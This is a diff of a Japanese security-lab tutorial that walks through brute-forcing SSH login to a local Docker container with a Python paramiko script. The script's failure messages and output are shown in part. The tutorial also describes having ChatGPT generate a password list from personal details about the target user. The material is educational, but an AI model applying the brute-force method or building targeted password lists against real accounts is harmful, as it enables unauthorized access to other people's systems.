@@ -44,9 +44,9 @@
 ---
 
 以下、Codespaceで行う場合の手順です。  
-まずは、`/workspaces/chibutsu-utokyo.github.io/docs/RemoteAccess`に移動して、docker_setup.shを実行してください。少し時間がかかります。
+まずは、`/workspaces/ubuntu-22.04/remote_access`に移動して、docker_setup.shを実行してください。少し時間がかかります。
 ```
-$ cd /workspaces/chibutsu-utokyo.github.io/docs/RemoteAccess
+$ cd /workspaces/ubuntu-22.04/remote_access
 
 # 権限を要求された場合
 $ chmod 700 docker_setup.sh
@@ -80,7 +80,11 @@ chibutsu@localhost: Permission denied (publickey,password).
 
 調査の結果、「chibutsu」さんは東京大学の地球惑星物理学科に所属する学生であることが分かりました。
 主に固体地球・大気海洋・宇宙惑星が好きな学生が所属する機関らしいです。  
-この情報を元にChatGPTにパスワードリストを作成してもらい、passwords.txtに保存しました。  
+この情報を元に、ChatGPTにパスワードリストを作成してもらい、passwords.txtに保存しました。このテキストファイルを開いて、中身を見てみてください。地物っぽい単語が並んでいると思います。
+
+!!! Note
+    ChatGPTの有効な活用の仕方については、「プロンプトエンジニアリング」で検索してみてください。  
+    書籍も数多く出版されていますが、ピンキリです。
 
 それでは、このパスワードリストを用いてSSHログインを試しましょう。  
 シェルスクリプトで攻撃コードを組むのは地味に大変なので、今回はPythonで組みました。  
@@ -123,7 +127,7 @@ with open(passwords_path, "r") as file:
 
             sys.exit()
         except paramiko.AuthenticationException:
-            print(f"{PASSWORD} is not correct...")
+            print(f"{PASSWORD} is not correct")
         finally:
             ssh.close()
 ```
@@ -134,12 +138,12 @@ with open(passwords_path, "r") as file:
 このコードを実行した結果、パスワードが奇跡的に判明しました。
 ```
 $ python bruteforce_ssh.py 
-earth is not correct...
-planet is not correct...
-physics is not correct...
+earth is not correct
+planet is not correct
+physics is not correct
 ...
-tornado is not correct...
-storm is not correct...
+tornado is not correct
+storm is not correct
 
 SUCCESS!
 username : chibutsu
@@ -188,5 +192,6 @@ chibutsu@960522125acf:~$
 - ハッキング・ラボのつくりかた 完全版 仮想環境におけるハッカー体験学習
 - 体系的に学ぶ安全なWebアプリケーションの作り方 第2版 脆弱性が生まれる原理と対策の実践
 - 実践 bashによるサイバーセキュリティ対策 セキュリティ技術者のためのシェルスクリプト活用術
+- セキュリティエンジニアのための機械学習 AI技術によるサイバーセキュリティ対策入門
 - 詳解セキュリティコンテスト CTFで学ぶ脆弱性攻略の技術
 - ソーシャル・エンジニアリング 最大の弱点“人間”をハッカーの魔の手から守るには
